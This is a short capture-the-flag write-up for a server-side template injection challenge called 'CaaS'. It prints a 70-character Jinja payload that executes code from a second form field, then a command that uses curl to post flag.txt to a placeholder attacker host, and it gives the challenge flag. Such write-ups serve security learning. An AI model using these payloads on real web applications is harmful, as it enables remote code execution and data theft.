# CaaS | NoobMaster

- Description: Curl as a Service is old, welcome to Certificate as a Service! Note: flag is in flag.txt

# Writeup
It's a SSTI challenge in the name field. The thing is that the blacklist is too big, and it's very hard to fit a payload to get the flag using 70 or less characters. But as you can see, we have two input options, name and team name. We can input a payload in the name field to execute our command in the team name field! Payload - {`{request.application.__builtins__.exec(request.values["team_name"])}}`. What this does is that it executes our input in the team name field. This payload is exactly 70 characters. Now in the team name field, you cannot print the data but you can use curl to send the flag to yourself. Final payload(name field)- `{{request.application.__builtins__.exec(request.values["team_name"])}}`. Team name field - `import os; os.system("curl https://YOUR_WEBSITE_LINK -d @flag.txt")`. The YOUR_WEBSITE_LINK is a simple website link, something like ngrok or beeceptor

# Flag: n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}